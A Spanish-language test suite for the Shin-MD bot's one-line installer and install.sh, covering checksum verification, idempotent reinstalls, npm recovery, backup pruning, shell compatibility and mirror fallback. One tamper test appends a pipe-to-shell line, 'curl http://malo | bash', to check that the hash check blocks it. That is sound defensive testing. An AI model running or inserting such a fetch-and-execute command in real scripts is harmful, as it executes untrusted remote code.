/**
 * Shin-MD - https://github.com/riokuroxi-svg/Shin-MD
 * Copyright (C) 2026 riokuroxi-svg
 * SPDX-License-Identifier: AGPL-3.0-only
 * Parte de Shin-MD. Mantener este header es obligatorio por AGPL.
 */
// ═══════════════════════════════════════════════════════════════════
//  arranque.test.js — El comando de una línea, probado de verdad.
//
//  Lo que esta suite protege es una promesa concreta: pegar el mismo
//  comando dos veces no puede dejar dos instalaciones, ni dos carpetas
//  `-viejo-`, ni un respaldo nuevo cada vez, ni un `npm ERR! EEXIST`
//  que deje el bot sin arrancar.
//
//  Se prueban dos piezas:
//    · shin.sh   el arranque: descarga, comprueba la huella y ejecuta.
//    · install.sh lo que hay detrás: reconocer la instalación existente,
//                 curarse de un npm atascado, no respaldar dos veces lo
//                 mismo, dejar `shin` en el PATH y arrancar el bot.
//
//  Igual que el resto de la suite: todo dentro de un directorio
//  temporal, con un $HOME falso por prueba, y siempre el install.sh de
//  la copia bajo prueba (nunca el del repositorio de trabajo).
// ═══════════════════════════════════════════════════════════════════

import { test } from "node:test";
import assert from "node:assert/strict";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import crypto from "node:crypto";
import { spawnSync, spawn } from "node:child_process";
import { fileURLToPath } from "node:url";

const AQUI = path.dirname(fileURLToPath(import.meta.url));
const RAIZ = path.resolve(AQUI, "..");
const INSTALADOR = path.join(RAIZ, "install.sh");
const ARRANQUE = path.join(RAIZ, "shin.sh");
const BIN_NODE = path.dirname(process.execPath);
const TMP = fs.realpathSync(os.tmpdir());
const NPM_REAL = (() => {
  const r = spawnSync("sh", ["-c", "command -v npm"], { encoding: "utf8" });
  return (r.stdout || "").trim();
})();

const temporales = [];
function temporal(etiqueta = "shin") {
  const d = fs.mkdtempSync(path.join(TMP, `${etiqueta}-`));
  temporales.push(d);
  assert.ok(fs.realpathSync(d).startsWith(TMP + path.sep), `fuera de ${TMP}`);
  return d;
}
process.on("exit", () => {
  for (const d of temporales) {
    try { fs.rmSync(d, { recursive: true, force: true }); } catch {}
  }
});

function escribir(archivo, contenido, modo) {
  fs.mkdirSync(path.dirname(archivo), { recursive: true });
  fs.writeFileSync(archivo, contenido);
  if (modo) fs.chmodSync(archivo, modo);
}

function git(cwd, ...args) {
  const r = spawnSync("git", args, {
    cwd,
    encoding: "utf8",
    env: {
      ...process.env,
      GIT_AUTHOR_NAME: "prueba", GIT_AUTHOR_EMAIL: "p@e.st",
      GIT_COMMITTER_NAME: "prueba", GIT_COMMITTER_EMAIL: "p@e.st",
    },
  });
  if (r.status !== 0) throw new Error(`git ${args.join(" ")}: ${r.stderr || r.stdout}`);
  return r.stdout;
}

/** Corre un script de shell con un $HOME propio y un PATH controlado. */
function correr(script, args, { cwd, home, pathExtra = [], env = {}, entrada } = {}) {
  const hogar = home || temporal("shin-home");
  const entorno = {
    ...process.env,
    NO_COLOR: "1",
    HOME: hogar,
    PATH: [...pathExtra, BIN_NODE, process.env.PATH].join(":"),
    SHIN_NO_BORRAR: `${RAIZ}:${process.env.SHIN_NO_BORRAR || ""}`,
    SHIN_ESPACIO_MIN_MB: "1",
    ...env,
  };
  const r = spawnSync("bash", [script, ...args], {
    cwd: cwd || TMP,
    env: entorno,
    encoding: "utf8",
    input: entrada,
    timeout: 300_000,
  });
  return { status: r.status, salida: `${r.stdout || ""}${r.stderr || ""}`, home: hogar };
}

/** Un proyecto de mentira pero con la forma exacta que espera el instalador. */
function crearOrigen(nombre = "shin-md") {
  const dir = temporal("shin-origen");
  escribir(path.join(dir, "package.json"), JSON.stringify({
    name: nombre,
    version: "9.9.9",
    private: true,
    type: "module",
    scripts: {
      start: "node index.js",
      consola: "node scripts/consola.mjs",
      vigia: "node scripts/vigia.mjs",
      postinstall: "node scripts/preparar.cjs",
    },
  }, null, 2) + "\n");
  // El bot de mentira dice una frase reconocible: así se puede comprobar que
  // el instalador lo arrancó de verdad y no solo que dijo que lo haría.
  escribir(path.join(dir, "index.js"), "console.log('BOT EN MARCHA');\n");
  escribir(path.join(dir, ".env.example"), "OWNER_NUMBER=\nPAIRING_METHOD=code\n");
  escribir(path.join(dir, ".gitignore"), "node_modules/\n.env\nbackups/\n");
  escribir(path.join(dir, "package-lock.json"), JSON.stringify({
    name: nombre, version: "9.9.9", lockfileVersion: 3, requires: true,
    packages: { "": { name: nombre, version: "9.9.9" } },
  }, null, 2) + "\n");
  escribir(path.join(dir, "scripts", "preparar.cjs"), `
const fs = require("node:fs");
const path = require("node:path");
const nm = path.join(__dirname, "..", "node_modules");
for (const m of ["express", "pino", "baileys", "sharp"]) {
  const d = path.join(nm, m);
  fs.mkdirSync(d, { recursive: true });
  fs.writeFileSync(path.join(d, "package.json"), JSON.stringify({ name: m, version: "1.0.0", main: "index.js" }));
  fs.writeFileSync(path.join(d, "index.js"), "module.exports = {};\\n");
}
const lib = path.join(nm, "baileys", "lib");
fs.mkdirSync(lib, { recursive: true });
fs.writeFileSync(path.join(lib, ".parcheado"), "8 de 8\\n");
`);
  escribir(path.join(dir, "scripts", "patch-baileys.cjs"), `
const fs = require("node:fs");
const path = require("node:path");
const marca = path.join(__dirname, "..", "node_modules", "baileys", "lib", ".parcheado");
const puesto = fs.existsSync(marca);
if (process.argv.includes("--check")) {
  console.log(puesto ? "los 8 parches están aplicados" : "faltan parches");
  process.exit(puesto ? 0 : 1);
}
process.exit(0);
`);
  escribir(path.join(dir, "install.sh"), fs.readFileSync(INSTALADOR, "utf8"));
  escribir(path.join(dir, "shin.sh"), fs.readFileSync(ARRANQUE, "utf8"));
  git(dir, "init", "--quiet", "--initial-branch", "main");
  git(dir, "add", "-A");
  git(dir, "commit", "--quiet", "-m", "origen de prueba");
  git(dir, "tag", "-a", "v9.9.9", "-m", "9.9.9");
  return dir;
}

/** Instala una vez y devuelve la carpeta que ha quedado. */
function instalar(origen, extra = {}) {
  const raiz = temporal("shin-inst");
  const r = correr(INSTALADOR, ["--yes", "--version", "v9.9.9"], {
    cwd: raiz,
    env: { SHIN_REPO_URL: origen, SHIN_INSTALL_ROOT: raiz, ...extra },
  });
  assert.equal(r.status, 0, `la instalación debía funcionar:\n${r.salida}`);
  return { raiz, proyecto: path.join(raiz, "Shin-MD"), home: r.home };
}

function carpetas(donde) {
  return fs.readdirSync(donde).filter((n) => n.startsWith("Shin-MD") && !n.includes("datos"));
}

// ═══════════════════════════════════════════════════════════════════
//  shin.sh — el comando de una línea
// ═══════════════════════════════════════════════════════════════════

/** Un "servidor" local con lo que publicaría una etiqueta. */
function publicar({ instalar: contenido, huellaCorrecta = true } = {}) {
  const dir = temporal("shin-publicado");
  const instalador = contenido ?? "#!/usr/bin/env bash\necho \"INSTALADOR EJECUTADO $*\"\n";
  escribir(path.join(dir, "install.sh"), instalador);
  const buena = crypto.createHash("sha256").update(instalador).digest("hex");
  const declarada = huellaCorrecta ? buena : "0".repeat(64);
  escribir(path.join(dir, "SHA256SUMS"), `${declarada}  install.sh\n`);
  return dir;
}

test("el comando de una línea comprueba la huella y ejecuta el instalador", () => {
  const publicado = publicar();
  const r = correr(ARRANQUE, [], {
    env: { SHIN_BASE_URL: `file://${publicado}`, SHIN_VERSION: "v9.9.9" },
  });
  assert.equal(r.status, 0, r.salida);
  assert.match(r.salida, /coincide/);
  assert.match(r.salida, /INSTALADOR EJECUTADO/);
  // Le pasa la versión y el modo autónomo: instala y arranca sin preguntar.
  assert.match(r.salida, /--version v9\.9\.9/);
  assert.match(r.salida, /--auto/);
  assert.match(r.salida, /--yes/);
});

test("con la huella cambiada no se ejecuta nada", () => {
  const publicado = publicar({ huellaCorrecta: false });
  escribir(path.join(publicado, "marca"), "");
  const r = correr(ARRANQUE, [], {
    env: { SHIN_BASE_URL: `file://${publicado}`, SHIN_VERSION: "v9.9.9" },
  });
  assert.notEqual(r.status, 0, "tiene que negarse");
  assert.doesNotMatch(r.salida, /INSTALADOR EJECUTADO/, "no puede ejecutarlo");
  assert.match(r.salida, /huella de .* NO coincide/i);
  assert.match(r.salida, /esperada/);
  assert.match(r.salida, /descargada/);
});

test("si el instalador viaja manipulado, la huella lo delata", () => {
  const publicado = publicar();
  fs.appendFileSync(path.join(publicado, "install.sh"), "curl http://malo | bash\n");
  const r = correr(ARRANQUE, [], {
    env: { SHIN_BASE_URL: `file://${publicado}`, SHIN_VERSION: "v9.9.9" },
  });
  assert.notEqual(r.status, 0);
  assert.doesNotMatch(r.salida, /INSTALADOR EJECUTADO/);
});

test("sin SHA256SUMS no se ejecuta el instalador", () => {
  const publicado = publicar();
  fs.rmSync(path.join(publicado, "SHA256SUMS"));
  const r = correr(ARRANQUE, [], {
    env: { SHIN_BASE_URL: `file://${publicado}`, SHIN_VERSION: "v9.9.9" },
  });
  assert.notEqual(r.status, 0);
  assert.doesNotMatch(r.salida, /INSTALADOR EJECUTADO/);
  assert.match(r.salida, /no ejecuto nada sin huella|no su huella/i);
});

test("si la versión no existe, lo dice y nombra el comando que la lista", () => {
  const publicado = publicar();
  const r = correr(ARRANQUE, [], {
    env: { SHIN_BASE_URL: `file://${publicado}/no-existe`, SHIN_VERSION: "v0.0.0" },
  });
  assert.notEqual(r.status, 0);
  assert.match(r.salida, /no está en ese espejo|No pude descargar/);
  assert.match(r.salida, /git ls-remote --tags/);
});

test("SHIN_SIN_ARRANQUE=1 instala sin arrancar el bot", () => {
  const publicado = publicar();
  const r = correr(ARRANQUE, [], {
    env: { SHIN_BASE_URL: `file://${publicado}`, SHIN_VERSION: "v9.9.9", SHIN_SIN_ARRANQUE: "1" },
  });
  assert.equal(r.status, 0, r.salida);
  assert.match(r.salida, /INSTALADOR EJECUTADO/);
  assert.match(r.salida, /--no-arrancar/,
    "el arranque tiene que decirle al instalador que no arranque el bot");
});

test("la etiqueta del arranque es la del paquete (o el comando apunta al vacío)", () => {
  const pkg = JSON.parse(fs.readFileSync(path.join(RAIZ, "package.json"), "utf8"));
  const m = fs.readFileSync(ARRANQUE, "utf8").match(/SHIN_VERSION:-v(\d+\.\d+\.\d+)/);
  assert.ok(m, "shin.sh tiene que declarar su versión");
  assert.equal(m[1], pkg.version,
    "shin.sh y package.json tienen que ir de la mano: ejecuta `npm run firma`");
});

test("el arranque publicado no se sirve desde main: va fijado a su etiqueta", () => {
  // Una publicación nueva no puede cambiar lo que hace un comando viejo.
  const texto = fs.readFileSync(ARRANQUE, "utf8");
  assert.match(texto, /SHIN_VERSION:-v\d+\.\d+\.\d+/,
    "la versión tiene que estar escrita en el archivo");
  assert.doesNotMatch(texto, /raw\.githubusercontent\.com\/[^/]+\/[^/]+\/main/,
    "no puede apuntar a main");
});

// ═══════════════════════════════════════════════════════════════════
//  install.sh — repetir el comando no puede duplicar nada
// ═══════════════════════════════════════════════════════════════════

test("repetir el comando desde la carpeta personal reconoce la instalación", () => {
  // Este era el fallo de verdad: el comando descarga el instalador en ~ y lo
  // ejecuta desde ahí, así que el script no está dentro de la instalación y
  // respondía "No sé sobre qué instalación actuar". En Termux eso es pegar el
  // mismo comando dos veces y que la segunda no haga nada.
  const origen = crearOrigen();
  const home = temporal("shin-casa");
  fs.copyFileSync(INSTALADOR, path.join(home, "install.sh"));

  const primera = correr(path.join(home, "install.sh"), ["--yes", "--version", "v9.9.9"], {
    cwd: home, home, env: { SHIN_REPO_URL: origen },
  });
  assert.equal(primera.status, 0, primera.salida);
  assert.deepEqual(carpetas(home), ["Shin-MD"]);

  const segunda = correr(path.join(home, "install.sh"), ["--yes", "--version", "v9.9.9"], {
    cwd: home, home, env: { SHIN_REPO_URL: origen },
  });
  assert.equal(segunda.status, 0, `la segunda pasada no puede fallar:\n${segunda.salida}`);
  assert.match(segunda.salida, /instalación reconocida/);
  assert.match(segunda.salida, /no hay nada que actualizar/);
  assert.deepEqual(carpetas(home), ["Shin-MD"], "no puede haber dos proyectos");
});

test("la segunda pasada no crea respaldos ni carpetas de sobra", () => {
  const origen = crearOrigen();
  const { raiz, proyecto, home } = instalar(origen);

  const tercera = correr(INSTALADOR, ["--yes", "--version", "v9.9.9"], {
    cwd: raiz, home, env: { SHIN_REPO_URL: origen, SHIN_INSTALL_ROOT: raiz },
  });
  assert.equal(tercera.status, 0, tercera.salida);

  const respaldos = fs.existsSync(path.join(proyecto, "backups"))
    ? fs.readdirSync(path.join(proyecto, "backups")) : [];
  assert.deepEqual(respaldos, [], "no hay nada que actualizar: no hay nada que respaldar");
  assert.deepEqual(carpetas(raiz), ["Shin-MD"]);
});

test("npm atascado con archivos duplicados se arregla solo, sin molestar", () => {
  const origen = crearOrigen();
  const { raiz, proyecto, home } = instalar(origen);

  // Un npm que la primera vez tropieza con restos de una instalación anterior,
  // que es lo que sale en Android: "EEXIST · File exists: …/node_modules/…".
  const falso = temporal("shin-npm");
  escribir(path.join(falso, "npm"), `#!/bin/sh
# Tropieza al INSTALAR (que es lo que pasa en Android), no al preguntarle
# la versión, que es una llamada distinta y no tiene por qué fallar.
case "$1" in
  ci|install)
    if [ ! -f "${falso}/ya-fallo" ]; then
      : > "${falso}/ya-fallo"
      echo "npm ERR! code EEXIST" >&2
      echo "npm ERR! File exists: $(pwd)/node_modules/.bin/x" >&2
      exit 1
    fi
    ;;
esac
exec "${NPM_REAL}" "$@"
`, 0o755);

  const r = correr(path.join(proyecto, "install.sh"), ["--repair"], {
    cwd: proyecto, home,
    pathExtra: [falso],
    env: { SHIN_REPO_URL: origen },
  });

  assert.equal(r.status, 0, `debía curarse solo:\n${r.salida}`);
  assert.match(r.salida, /archivos duplicados/);
  assert.match(r.salida, /dependencias instaladas/);
  // Y el bot puede arrancar: los cuatro módulos están.
  for (const m of ["express", "pino", "baileys", "sharp"]) {
    assert.ok(fs.existsSync(path.join(proyecto, "node_modules", m, "index.js")), `falta ${m}`);
  }
});

test("un error de npm que no es de duplicados NO se disfraza", () => {
  const origen = crearOrigen();
  const { proyecto, home } = instalar(origen);
  const falso = temporal("shin-npm-roto");
  escribir(path.join(falso, "npm"), `#!/bin/sh
case "$1" in
  ci|install)
    echo "npm ERR! code E404" >&2
    echo "npm ERR! 404 Not Found" >&2
    exit 1
    ;;
esac
exec "${NPM_REAL}" "$@"
`, 0o755);

  const r = correr(path.join(proyecto, "install.sh"), ["--repair"], {
    cwd: proyecto, home,
    pathExtra: [falso],
    env: { SHIN_REPO_URL: origen },
  });
  assert.notEqual(r.status, 0, "no puede dar por buena una instalación que falló");
  assert.doesNotMatch(r.salida, /archivos duplicados/);
  assert.match(r.salida, /Falló la instalación de dependencias|no dejó la instalación sana/);
});

test("los respaldos automáticos no crecen sin fin", () => {
  const origen = crearOrigen();
  const { raiz, proyecto, home } = instalar(origen);

  // Siete respaldos con el nombre exacto que escribe el instalador.
  const carpeta = path.join(proyecto, "backups");
  for (let i = 1; i <= 7; i += 1) {
    const nombre = `pre-actualizacion-2026010${i}-000000`;
    fs.mkdirSync(path.join(carpeta, nombre), { recursive: true });
    fs.writeFileSync(path.join(carpeta, nombre, "marca"), String(i));
  }
  // Uno hecho a mano, con otro nombre: ese no se poda nunca.
  fs.mkdirSync(path.join(carpeta, "mi-copia-a-mano"), { recursive: true });

  // Una versión nueva de verdad, para que haya algo que actualizar y respaldar.
  escribir(path.join(origen, "NOVEDADES.md"), "nuevo\n");
  git(origen, "add", "-A");
  git(origen, "commit", "--quiet", "-m", "novedad");

  const r = correr(path.join(proyecto, "install.sh"), ["--update", "--branch", "main"], {
    cwd: proyecto, home, env: { SHIN_REPO_URL: origen, SHIN_RESPALDOS_A_GUARDAR: "3" },
  });
  assert.equal(r.status, 0, r.salida);
  assert.match(r.salida, /datos respaldados/);

  const quedan = fs.readdirSync(carpeta).filter((n) => n.startsWith("pre-actualizacion-"));
  assert.equal(quedan.length, 3, `quedan ${quedan.length}: ${quedan.join(", ")}`);
  assert.ok(fs.existsSync(path.join(carpeta, "mi-copia-a-mano")),
    "el respaldo que hizo la persona no se toca");
});

// ═══════════════════════════════════════════════════════════════════
//  El comando `shin` y el arranque
// ═══════════════════════════════════════════════════════════════════

test("el instalador deja un comando `shin` que arranca el bot", () => {
  const origen = crearOrigen();
  const { home, proyecto } = instalar(origen);

  const lanzador = path.join(home, ".local", "bin", "shin");
  assert.ok(fs.existsSync(lanzador), "tiene que existir el lanzador");
  const texto = fs.readFileSync(lanzador, "utf8");
  assert.ok(texto.startsWith("#!"), "un script sin intérprete no arranca en Android");
  assert.match(texto, /--run/);
  assert.ok(texto.includes(proyecto), "tiene que apuntar a la instalación de verdad");

  const r = correr(lanzador, [], { cwd: TMP, home });
  assert.equal(r.status, 0, r.salida);
  assert.match(r.salida, /BOT EN MARCHA/, "el lanzador tiene que arrancar el bot");
});

test("`shin update` actualiza sin duplicar y vuelve a arrancar", () => {
  const origen = crearOrigen();
  const { home, proyecto } = instalar(origen);
  const lanzador = path.join(home, ".local", "bin", "shin");

  const r = correr(lanzador, ["update"], { cwd: TMP, home, env: { SHIN_REPO_URL: origen } });
  assert.equal(r.status, 0, r.salida);
  assert.match(r.salida, /no hay nada que actualizar/);
  assert.match(r.salida, /BOT EN MARCHA/);
  assert.deepEqual(carpetas(path.dirname(proyecto)), ["Shin-MD"]);
});

test("`shin --help` enseña la ayuda y no arranca nada", () => {
  const origen = crearOrigen();
  const { home } = instalar(origen);
  const lanzador = path.join(home, ".local", "bin", "shin");
  const r = correr(lanzador, ["--help"], { cwd: TMP, home });
  assert.equal(r.status, 0, r.salida);
  assert.match(r.salida, /--auto/);
  assert.match(r.salida, /--go/);
  assert.doesNotMatch(r.salida, /BOT EN MARCHA/);
});

test("no pisa un `shin` que no es suyo: usa el nombre del paquete", () => {
  const origen = crearOrigen();
  const raiz = temporal("shin-ajeno");
  const home = temporal("shin-home-ajeno");
  escribir(path.join(home, ".local", "bin", "shin"), "#!/bin/sh\necho soy-de-otra-cosa\n", 0o755);

  const r = correr(INSTALADOR, ["--yes", "--version", "v9.9.9"], {
    cwd: raiz, home, env: { SHIN_REPO_URL: origen, SHIN_INSTALL_ROOT: raiz },
  });
  assert.equal(r.status, 0, r.salida);
  assert.equal(fs.readFileSync(path.join(home, ".local", "bin", "shin"), "utf8"),
    "#!/bin/sh\necho soy-de-otra-cosa\n", "el shin de otro no se toca");
  assert.ok(fs.existsSync(path.join(home, ".local", "bin", "shin-md")),
    "y se usa el nombre del paquete");
});

test("--go arranca el bot al terminar, sin npm start de por medio", () => {
  const origen = crearOrigen();
  const raiz = temporal("shin-go");
  const r = correr(INSTALADOR, ["--yes", "--version", "v9.9.9", "--go"], {
    cwd: raiz, env: { SHIN_REPO_URL: origen, SHIN_INSTALL_ROOT: raiz },
  });
  assert.equal(r.status, 0, r.salida);
  assert.match(r.salida, /Arrancando/);
  assert.match(r.salida, /BOT EN MARCHA/);
});

test("--auto instala desde cero y arranca, todo en una pasada", () => {
  const origen = crearOrigen();
  const raiz = temporal("shin-auto");
  const r = correr(INSTALADOR, ["--version", "v9.9.9", "--auto"], {
    cwd: raiz, env: { SHIN_REPO_URL: origen, SHIN_INSTALL_ROOT: raiz },
  });
  assert.equal(r.status, 0, r.salida);
  assert.match(r.salida, /BOT EN MARCHA/);
  assert.deepEqual(carpetas(raiz), ["Shin-MD"]);
});

test("--auto repara una instalación rota en vez de reinstalarla", () => {
  const origen = crearOrigen();
  const { raiz, proyecto, home } = instalar(origen);
  fs.rmSync(path.join(proyecto, "node_modules"), { recursive: true, force: true });

  const r = correr(INSTALADOR, ["--version", "v9.9.9", "--auto"], {
    cwd: raiz, home, env: { SHIN_REPO_URL: origen, SHIN_INSTALL_ROOT: raiz },
  });
  assert.equal(r.status, 0, r.salida);
  assert.match(r.salida, /Reparando dependencias/);
  assert.match(r.salida, /BOT EN MARCHA/);
  assert.deepEqual(carpetas(raiz), ["Shin-MD"], "no puede haber acabado en otra carpeta");
});

test("con el bot ya corriendo desde esa carpeta, no arranca un segundo", () => {
  const origen = crearOrigen();
  const { proyecto, home } = instalar(origen);

  // Un bot que se queda vivo (el index.js de verdad dura horas).
  fs.writeFileSync(path.join(proyecto, "index.js"),
    "setTimeout(() => {}, 30000);\n");
  const hijo = spawn(process.execPath, ["index.js"], { cwd: proyecto, stdio: "ignore" });
  try {
    // Un instante para que el proceso aparezca con su carpeta de trabajo.
    spawnSync("sleep", ["0.4"]);
    const r = correr(path.join(proyecto, "install.sh"), ["--run"], { cwd: proyecto, home });
    assert.equal(r.status, 0, r.salida);
    assert.match(r.salida, /ya hay un Shin-MD corriendo/);
    assert.match(r.salida, /no arranco otro/);
  } finally {
    try { hijo.kill("SIGKILL"); } catch {}
  }
});

test("--run no consulta el repositorio: arranca y ya", () => {
  const origen = crearOrigen();
  const { proyecto, home } = instalar(origen);
  // Se rompe el remoto a propósito: si --run intentara actualizar, fallaría.
  git(proyecto, "remote", "set-url", "origin", "/tmp/no-existe-esta-cosa");
  const r = correr(path.join(proyecto, "install.sh"), ["--run"], { cwd: proyecto, home });
  assert.equal(r.status, 0, r.salida);
  assert.match(r.salida, /BOT EN MARCHA/);
  assert.doesNotMatch(r.salida, /consultar el repositorio/);
});

test("la ayuda del instalador enseña las opciones nuevas", () => {
  const r = correr(INSTALADOR, ["--help"], {});
  assert.equal(r.status, 0, r.salida);
  for (const opcion of ["--auto", "--go", "--run", "--code", "--qr"]) {
    assert.match(r.salida, new RegExp(opcion.replace(/-/g, "\\-")), `falta ${opcion}`);
  }
});

// ═══════════════════════════════════════════════════════════════════
//  Compatibilidad real de shell, espejos y red floja
//
//  El comando dice `| sh`, así que tiene que funcionar con el `/bin/sh`
//  que haya: dash en Debian, ash de busybox en Alpine, bash en macOS.
//  Estas pruebas lo ejecutan con cada uno que exista en la máquina.
// ═══════════════════════════════════════════════════════════════════

function hayOrden(nombre) {
  const r = spawnSync("sh", ["-c", `command -v ${nombre}`], { encoding: "utf8" });
  return (r.stdout || "").trim();
}

test("el arranque es POSIX: dash y busybox lo aceptan", () => {
  const shells = [["dash", hayOrden("dash")], ["busybox", hayOrden("busybox")]].filter(([, ruta]) => ruta);
  assert.ok(shells.length > 0, "la máquina de pruebas no tiene dash ni busybox");
  for (const [nombre, ruta] of shells) {
    const args = nombre === "busybox" ? ["sh", "-n", ARRANQUE] : ["-n", ARRANQUE];
    const r = spawnSync(ruta, args, { encoding: "utf8" });
    assert.equal(r.status, 0, `${nombre} no acepta el arranque:\n${r.stderr}`);
    // Los comentarios hablan de `[[ ]]` justamente para decir que no se usa:
    // se miran solo las líneas que son código.
    const codigo = fs.readFileSync(ARRANQUE, "utf8")
      .split("\n")
      .filter((l) => !/^\s*#/.test(l))
      .join("\n");
    assert.doesNotMatch(codigo, /\[\[|\$\{[A-Za-z_]+\[|\bfunction\s+\w+\s*\(|\blocal\s+\w+=/,
      "no puede haber bashismos: el comando dice `| sh`");
  }
});

test("instala de verdad ejecutado con dash y con busybox", () => {
  const origen = crearOrigen();
  const publicado = temporal("shin-pub-sh");
  fs.copyFileSync(path.join(origen, "install.sh"), path.join(publicado, "install.sh"));
  const sumas = crypto.createHash("sha256").update(fs.readFileSync(path.join(publicado, "install.sh"))).digest("hex");
  fs.writeFileSync(path.join(publicado, "SHA256SUMS"), `${sumas}  install.sh\n`);

  for (const nombre of ["dash", "busybox"].filter((n) => hayOrden(n))) {
    const raiz = temporal(`shin-sh-${nombre}`);
    const args = nombre === "busybox" ? ["sh", ARRANQUE] : [ARRANQUE];
    const r = spawnSync(nombre, args, {
      cwd: raiz,
      encoding: "utf8",
      env: {
        ...process.env,
        NO_COLOR: "1",
        HOME: raiz,
        PATH: [`${BIN_NODE}:${process.env.PATH}`].join(":"),
        SHIN_NO_BORRAR: RAIZ,
        SHIN_ESPACIO_MIN_MB: "1",
        SHIN_NO_INSTALAR: "1",
        SHIN_REPO_URL: origen,
        SHIN_INSTALL_ROOT: raiz,
        SHIN_BASE_URL: `file://${publicado}`,
        SHIN_VERSION: "v9.9.9",
      },
      timeout: 300_000,
    });
    const salida = `${r.stdout || ""}${r.stderr || ""}`;
    assert.equal(r.status, 0, `${nombre} no pudo instalar:\n${salida}`);
    assert.match(salida, /coincide/);
    assert.ok(fs.existsSync(path.join(raiz, "Shin-MD", "package.json")), `${nombre} no dejó la instalación`);
  }
});

test("si un espejo no responde, usa el siguiente", () => {
  const origen = crearOrigen();
  const publicado = temporal("shin-espejo");
  fs.copyFileSync(path.join(origen, "install.sh"), path.join(publicado, "install.sh"));
  const sumas = crypto.createHash("sha256").update(fs.readFileSync(path.join(publicado, "install.sh"))).digest("hex");
  fs.writeFileSync(path.join(publicado, "SHA256SUMS"), `${sumas}  install.sh\n`);

  const r = correr(ARRANQUE, ["--dry-run"], {
    env: {
      SHIN_MIRRORS: `file://${path.join(TMP, "no-existe-este-espejo")} file://${publicado}`,
      SHIN_VERSION: "v9.9.9",
      SHIN_INTENTOS: "2",
    },
  });
  assert.equal(r.status, 0, r.salida);
  assert.match(r.salida, /no pude bajar el instalador/);
  assert.match(r.salida, /coincide/);
  assert.match(r.salida, /no ejecuto nada/, "en modo comprobación no se ejecuta");
});

test("un espejo que sirve un archivo distinto no se usa", () => {
  const malo = publicar({ huellaCorrecta: true });
  fs.appendFileSync(path.join(malo, "install.sh"), "# manipulado\n");
  const bueno = publicar();
  const r = correr(ARRANQUE, ["--dry-run"], {
    env: { SHIN_MIRRORS: `file://${malo} file://${bueno}`, SHIN_VERSION: "v9.9.9" },
  });
  assert.equal(r.status, 0, r.salida);
  assert.match(r.salida, /huella de .* NO coincide/);
  assert.match(r.salida, /coincide/);
});

test("la red que falla a ratos se reintenta sola", () => {
  // Un curl que falla las dos primeras veces y luego funciona: es lo que
  // pasa de verdad en datos móviles, y no debe obligar a empezar de cero.
  const origen = crearOrigen();
  const publicado = temporal("shin-red");
  fs.copyFileSync(path.join(origen, "install.sh"), path.join(publicado, "install.sh"));
  const sumas = crypto.createHash("sha256").update(fs.readFileSync(path.join(publicado, "install.sh"))).digest("hex");
  fs.writeFileSync(path.join(publicado, "SHA256SUMS"), `${sumas}  install.sh\n`);

  const falso = temporal("shin-curl-flojo");
  const marca = path.join(falso, "intentos");
  escribir(path.join(falso, "curl"), `#!/bin/sh
n=$(cat "${marca}" 2>/dev/null || echo 0)
n=$((n + 1))
echo "$n" > "${marca}"
if [ "$n" -le 2 ]; then exit 6; fi
exec "${hayOrden("curl")}" "$@"
`, 0o755);

  const r = correr(ARRANQUE, ["--dry-run"], {
    pathExtra: [falso],
    env: {
      SHIN_BASE_URL: `file://${publicado}`,
      SHIN_VERSION: "v9.9.9",
      SHIN_INTENTOS: "4",
      SHIN_ESPERA: "1",
    },
  });
  assert.equal(r.status, 0, `debía recuperarse solo:\n${r.salida}`);
  assert.match(r.salida, /la red falló \(intento 1 de 4\)/);
  assert.match(r.salida, /coincide/);
});
